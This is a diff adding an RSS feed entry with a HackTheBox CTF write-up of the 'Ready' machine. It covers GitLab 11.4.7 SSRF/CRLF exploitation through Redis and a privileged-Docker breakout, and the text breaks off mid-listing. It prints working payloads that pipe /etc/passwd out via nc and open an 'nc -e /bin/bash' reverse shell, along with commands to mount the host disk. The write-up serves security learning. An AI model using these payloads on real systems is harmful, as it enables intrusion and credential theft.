@@ -710,5 +710,676 @@ spectra
 ]]></content:encoded>
     </item>
     
+    <item>
+      <title>HackTheBox - Ready</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</link>
+      <pubDate>Sat, 15 May 2021 22:00:39 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</guid>
+      <description>Turns SSRF to remote code execution and escape from Docker container</description>
+      <content:encoded><![CDATA[<p>Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I&rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>GitLab 11.4.7 exploitation</li>
+<li>Chaining bugs from CVE-2018-19571 and CVE-2018-19585</li>
+<li>Docker security</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>BurpSuite - Preinstalled in Kali Linux</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>All ports scan with <code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 5080</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
+$ nmap -p- -sV --reason -oA nmap/10-initial-ready <span style="color:#e6db74">&#39;10.10.10.220&#39;</span>
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-14 04:53 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.220
+Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed ports
+Reason: <span style="color:#ae81ff">65533</span> resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+5080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> nginx
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 503.44 seconds
+</code></pre></div><p>After performing a default script scan shows there&rsquo;s a GitLab instance on port 5080.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
+$ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-14 05:17 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.220
+Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.090s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+5080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> nginx
+| http-robots.txt: <span style="color:#ae81ff">53</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in <span style="color:#ae81ff">\x</span>C2<span style="color:#ae81ff">\x</span>B7 GitLab
+|_Requested resource was http://10.10.10.220:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.70 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-5080---gitlab">TCP 5080 - GitLab</h3>
+<p>The page displays a self-hosted GitLab Community Edition.</p>
+<p><img class="img-container" src="imgs/image-20210514162031899.png" alt="image-20210514162031899"  />
+</p>
+<p>I can register with any email domain.</p>
+<p><img class="img-container" src="imgs/image-20210514162151369.png" alt="image-20210514162151369"  />
+</p>
+<p>The GitLab version can be seen by visiting<code>/help</code>, and it seems to be an outdated one.</p>
+<p><img class="img-container" src="imgs/image-20210514162920343.png" alt="image-20210514162920343"  />
+</p>
+<p>I&rsquo;ll take a note on the version.</p>
+<h4 id="user-enumeration-via-gitlab-api">User Enumeration via GitLab API</h4>
+<p>I can enumerate the GitLab users via <code>/api/v4/users</code>, but in the end, this was not used.</p>
+<p><img class="img-container" src="imgs/image-20210514162754664.png" alt="image-20210514162754664"  />
+</p>
+<p>I&rsquo;ll move and search for vulnerabilities.</p>
+<h4 id="searchsploit">Searchsploit</h4>
+<p>I can feed the GitLab version to <code>searchsploit</code>, and it returns with two exploits that match with the version.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «~» «10.10.14.20» 
+$ searchsploit GitLab 11.4.7    
+-------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                            |  Path
+-------------------------------------------------------------------------- ---------------------------------
+GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
+-------------------------------------------------------------------------- ---------------------------------
+</code></pre></div><p>I relaxed the search keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit <a href="/writeup/htb-laboratory">Laboratory</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20»
+$ searchsploit GitLab
+-------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                            |  Path
+-------------------------------------------------------------------------- ---------------------------------
+GitLab - &#39;impersonate&#39; Feature Privilege Escalation                       | ruby/webapps/40236.txt
+GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
+GitLab 12.9.0 - Arbitrary File Read                                       | ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                       | ruby/webapps/49076.py
+Gitlab 6.0 - Persistent Cross-Site Scripting                              | php/webapps/30329.sh
+Gitlab-shell - Code Execution (Metasploit)                                | linux/remote/34362.rb
+Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting         | java/webapps/47927.txt
+NPMJS gitlabhook 0.0.17 - &#39;repository&#39; Remote Command Execution           | json/webapps/47420.txt
+-------------------------------------------------------------------------- ---------------------------------
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-git">Shell as git</h3>
+<h4 id="gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc">GitLab 11.4.7 RCE (CVE-2018-19571 &amp; CVE-2018-19585) - PoC</h4>
+<p>The RCE exploit that was popped on <code>searchsploit</code> above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit&rsquo;s author uses the <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">LifeOverFlow</a>&rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.</p>
+<p>With SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (<code># ==&gt;</code>  is a comment by me)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">GET blablabla HTTP/1.1 # ==&gt; Redis read this as a command 
+</span><span style="color:#960050;background-color:#1e0010">Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 
+</span><span style="color:#960050;background-color:#1e0010">User-Agent: git/2.18.1  
+</span><span style="color:#960050;background-color:#1e0010">Accept: */* 
+</span><span style="color:#960050;background-color:#1e0010">Accept-Encoding: deflate, gzip 
+</span><span style="color:#960050;background-color:#1e0010">Pragma: no-cache 
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">- Err wrong number of arguments for &#39;get&#39; command 
+</span></code></pre></div><p>The idea here is to use the CRLF Injection to insert a payload after the &lsquo;GET&rsquo;  line.</p>
+<p>For this, I’ll need Burp Suite turned on.</p>
+<p>On GitLab, I’ll import a (non-exist) project and choose the &ldquo;Repo by URL&rdquo; menu.</p>
+<p><img class="img-container" src="imgs/image-20210514171125509.png" alt="image-20210514171125509"  />
+</p>
+<p>I&rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> and add my (non-exist) <code>.git</code> repository at the end of the URL, so it becomes <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git</code></p>
+<p><img class="img-container" src="imgs/image-20210515000620634.png" alt="image-20210515000620634"  />
+</p>
+<blockquote>
+<p>The repository URL above is a <a href="http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm">special IPv6 address</a> where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in <code>spec/lib/gitlab/url_blocker_spec.rb</code></p>
+</blockquote>
+<p>I&rsquo;ll intercept the request after I hit the “Create Project” button, and then on BurpSuite, I’ll modify the import URL to this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
+ multi
+
+ sadd resque:gitlab:queues system_hook_push
+
+ lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
+
+ exec
+ exec
+/ssrf-test.git
+</code></pre></div><p>So the HTTP request now looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /projects <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.10.220:5080</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.220:5080/projects/new</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">778</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+utf8=%E2%9C%93&amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D&amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
+ multi
+
+ sadd resque:gitlab:queues system_hook_push
+
+ lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
+
+ exec
+ exec
+/ssrf-test.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=SSRF+test&amp;project%5Bnamespace_id%5D=5&amp;project%5Bpath%5D=ssrf-test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
+</code></pre></div><p>After I hit the send button, my <code>nc</code> listener caught the file contents of <code>/etc/passwd</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> root@kali «exploit» «10.10.14.20» 
+$ nc -nvlp <span style="color:#ae81ff">9000</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.20<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.220<span style="color:#f92672">]</span> <span style="color:#ae81ff">36612</span>
+...&lt;SNIP&gt;...
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
+dude:x:1000:1000::/home/dude:/bin/bash
+</code></pre></div><p><img class="img-container" src="imgs/image-20210515002210570.png" alt="image-20210515002210570"  />
+</p>
+<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
+<p>From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
+ multi
+
+ sadd resque:gitlab:queues system_hook_push
+
+ lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|nc -e /bin/bash 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
+
+ exec
+ exec
+/ssrf-to-rce.git
+</code></pre></div><p>On my <code>nc</code> listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20» 
+$ nc -nvlp 9000
+listening on [any] 9000 ...
+connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 37306
+id
+uid=998(git) gid=998(git) groups=998(git)
+hostname
+gitlab.example.com
+pwd   
+/var/opt/gitlab/gitlab-rails/working
+</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I&rsquo;ll do the &lsquo;stty&rsquo; trick to <a href="https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1">upgrade my shell</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">which python3
+/opt/gitlab/embedded/bin/python3
+python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+git@gitlab:~/gitlab-rails/working$ ^Z
+<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">2354</span> suspended  nc -nvlp <span style="color:#ae81ff">9000</span>
+→ root@kali «exploit» «10.10.14.20» 
+$ stty raw -echo; fg
+<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>  - <span style="color:#ae81ff">2354</span> continued  nc -nvlp <span style="color:#ae81ff">9000</span>
+
+git@gitlab:~/gitlab-rails/working$ 
+git@gitlab:~/gitlab-rails/working$ export TERM<span style="color:#f92672">=</span>xterm
+</code></pre></div><p>On <code>/home</code>, there is only one user called <code>dude</code>, and I&rsquo;m able to read the user flag there.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/home/dude$ ls -la
+total <span style="color:#ae81ff">24</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> dude dude <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">7</span> 16:58 .
+drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">2</span> 10:45 ..
+lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec  <span style="color:#ae81ff">7</span> 16:58 .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude  <span style="color:#ae81ff">220</span> Aug <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2015</span> .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude <span style="color:#ae81ff">3771</span> Aug <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2015</span> .bashrc
+-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude  <span style="color:#ae81ff">655</span> May <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2017</span> .profile
+-r--r----- <span style="color:#ae81ff">1</span> dude git    <span style="color:#ae81ff">33</span> Dec  <span style="color:#ae81ff">2</span> 10:46 user.txt
+git@gitlab:/home/dude$ cat user.txt 
+e1e30b052b6ec0670698...&lt;SNIP&gt;...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="container-enumeration">Container enumeration</h4>
+<p>I found a <code>.dockerenv</code> on the root directory which indicates that I&rsquo;m inside container, and there is also a file called <code>root_pass</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:~$ ls -la /
+total <span style="color:#ae81ff">104</span>
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">1</span> 12:41 .
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">1</span> 12:41 ..
+-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Dec  <span style="color:#ae81ff">1</span> 12:41 .dockerenv
+...&lt;SNIP&gt;...
+-rw-r--r--   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">23</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> root_pass
+</code></pre></div><p>The content of <code>root_pass</code> is a random string, which I think it is a password. I tried it to the user and root account but it didn&rsquo;t work.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ cat /root_pass 
+YG65407Bjqvv9A0a8Tm_7w
+</code></pre></div><p>Exploring on <code>/opt</code>, I found a folder called <code>backup</code>. The folder contains three files: <code>docker-compose.yml</code>, <code>gitlab-secrets.json</code> and <code>gitlab.rb</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ ls -l
+total <span style="color:#ae81ff">100</span>
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">872</span> Dec  <span style="color:#ae81ff">7</span> 09:25 docker-compose.yml
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15092</span> Dec  <span style="color:#ae81ff">1</span> 16:23 gitlab-secrets.json
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">79639</span> Dec  <span style="color:#ae81ff">1</span> 19:20 gitlab.rb
+</code></pre></div><p>Upon performing a recursive grep to search for files containing a &ldquo;pass&rdquo; string inside the folder, I discovered an SMTP password on <code>gitlab.rb</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ grep -Ri <span style="color:#e6db74">&#34;pass&#34;</span>
+...&lt;SNIP&gt;...
+gitlab.rb:gitlab_rails<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;smtp_password&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wW59U!ZKMbG9+*#h&#34;</span>
+...&lt;SNIP&gt;...
+</code></pre></div><p>Looking into the <code>docker-compose.yml</code>, I see a potential vector for container breakout.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ae81ff">git@gitlab:/opt/backup$ cat docker-compose.yml </span>
+<span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;2.4&#39;</span>
+
+<span style="color:#f92672">services</span>:
+  <span style="color:#f92672">web</span>:
+    <span style="color:#f92672">image</span>: <span style="color:#e6db74">&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span>
+    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
+    <span style="color:#f92672">hostname</span>: <span style="color:#e6db74">&#39;gitlab.example.com&#39;</span>
+    <span style="color:#f92672">environment</span>:
+      <span style="color:#f92672">GITLAB_OMNIBUS_CONFIG</span>: |<span style="color:#e6db74">
+</span><span style="color:#e6db74">        external_url &#39;http://172.19.0.2&#39;
+</span><span style="color:#e6db74">        redis[&#39;bind&#39;]=&#39;127.0.0.1&#39;
+</span><span style="color:#e6db74">        redis[&#39;port&#39;]=6379
+</span><span style="color:#e6db74">        gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)</span>        
+    <span style="color:#f92672">networks</span>:
+      <span style="color:#f92672">gitlab</span>:
+        <span style="color:#f92672">ipv4_address</span>: <span style="color:#ae81ff">172.19.0.2</span>
+    <span style="color:#f92672">ports</span>:
+      - <span style="color:#e6db74">&#39;5080:80&#39;</span>
+      <span style="color:#75715e">#- &#39;127.0.0.1:5080:80&#39;</span>
+      <span style="color:#75715e">#- &#39;127.0.0.1:50443:443&#39;</span>
+      <span style="color:#75715e">#- &#39;127.0.0.1:5022:22&#39;</span>
+    <span style="color:#f92672">volumes</span>:
+      - <span style="color:#e6db74">&#39;./srv/gitlab/config:/etc/gitlab&#39;</span>
+      - <span style="color:#e6db74">&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span>
+      - <span style="color:#e6db74">&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span>
+      - <span style="color:#e6db74">&#39;./root_pass:/root_pass&#39;</span>
+    <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span> <span style="color:#75715e"># ==&gt; Potential privesc vector</span>
+    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
+    <span style="color:#75715e">#mem_limit: 1024m</span>
+
+<span style="color:#f92672">networks</span>:
+  <span style="color:#f92672">gitlab</span>:
+    <span style="color:#f92672">driver</span>: <span style="color:#ae81ff">bridge</span>
+    <span style="color:#f92672">ipam</span>:
+      <span style="color:#f92672">config</span>:
+        - <span style="color:#f92672">subnet</span>: <span style="color:#ae81ff">172.19.0.0</span><span style="color:#ae81ff">/16</span>
+</code></pre></div><h4 id="su---root-container">su - root (container)</h4>
+<p>The password <code>wW59U!ZKMbG9+*#h</code> works on the container root account</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">git@gitlab:/opt/gitlab$ su root
+Password: wW59U!ZKMbG9+*#h
+root@gitlab:/opt/gitlab# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div><h4 id="docker-breakout">Docker Breakout</h4>
+<p>Based on the <code>docker-compose.yml</code> file, I suspect the container is running with privileged flag. According to my favorite blog, which is <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#">BookHackTrick</a>, a container with privileged flag will have access to the host devices.</p>
+<p>Although, <code>--privileged</code> gives all the Linux capabilities, I&rsquo;ll still check it manually to make sure I have access to the host devices.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/opt/gitlab# capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
+...&lt;SNIP&gt;...
+</code></pre></div><p>There is a <code>CAP_SYS_ADMIN</code>, with this capabilities I&rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with <code>fdisk -l</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:~# fdisk -l
+
+...&lt;SNIP&gt;...
+Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: gpt
+Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E
+
+Device        Start      End  Sectors Size Type
+/dev/sda1      2048     4095     2048   1M BIOS boot
+/dev/sda2      4096 37746687 37742592  18G Linux filesystem # the root (/) dir
+/dev/sda3  37746688 41940991  4194304   2G Linux swap
+</code></pre></div><p>Now I can simply mount the Linux filesystem (<code>/dev/sda2</code>) to my specified folder.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/media# mkdir iamf
+root@gitlab:/media# mount /dev/sda2 /media/iamf
+root@gitlab:/media# ls iamf/
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
+</code></pre></div><p>The root user of the host has SSH keys, I’ll grab only the private key to my machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@gitlab:/media# ls -l iamf/root/.ssh/ 
+total 12
+-rw------- 1 root root  405 Dec  7 16:49 authorized_keys
